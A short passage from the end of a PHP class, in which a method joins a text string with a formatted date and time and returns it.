        $data= $text.' '.date('m-d',$time).' '.date('H:i',$time);

        return $data;
    }
}










